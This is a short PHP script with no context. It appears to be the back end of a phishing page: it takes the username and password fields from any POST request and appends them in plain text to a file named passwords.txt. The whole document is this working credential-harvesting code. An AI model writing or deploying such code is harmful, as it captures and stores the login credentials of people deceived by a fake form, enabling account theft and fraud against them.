<?php

    if(isset($_POST['user']) && isset($_POST['pass'])) {
        $details_file = fopen("passwords.txt", "a");
        $str = 'username: '.$_POST['user'].'password: '.$_POST['pass']. PHP_EOL;
        file_put_contents('passwords.txt', $str, FILE_APPEND);
    }

?>
